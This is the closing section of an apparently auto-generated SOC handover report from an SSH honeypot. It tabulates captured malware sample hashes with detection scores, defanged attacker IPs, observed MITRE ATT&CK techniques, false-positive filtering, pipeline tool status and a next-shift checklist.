| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `118.175.205[.]9` | TH | TOT Public Company Limited Bangkok | **100** ⚠️ | 0 |
| `83.239.0[.]202` | RU | OJSC Rostelecom Macroregional Branch South | **100** ⚠️ | 35 |
| `122.176.156[.]82` | IN | BHARTI TELENET LTD. NEW DELHI | **100** ⚠️ | 7 |
| `103.220.91[.]138` | IN | Mft Internet Private Limited | **100** ⚠️ | 46 |
| `116.114.94[.]242` | CN | China Unicom Neimeng Province Network | **100** ⚠️ | 50 |
| `152.52.205[.]86` | IN | BHARTI-AIRTEL | **100** ⚠️ | 22 |
| `118.32.34[.]173` | KR | Korea Telecom | **100** ⚠️ | 4 |
| `174.94.236[.]211` | CA | Bell Mobility, Inc. | **100** ⚠️ | 15 |
| `113.158.205[.]225` | JP | DION (KDDI CORPORATION) | **100** ⚠️ | 50 |
| `183.237.33[.]162` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 25 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 18 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 5 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |

---

## 🔕 False Positive Summary (8 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 44 cases |
| Tool 34  | Credential Extractor        | ✅ 27 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 32 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 8 filtered (18.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 26 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 5 priority case(s) shown individually · 22 recon entry/entries in table (4 group(s) consolidating 13 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-02T18:54:55Z_
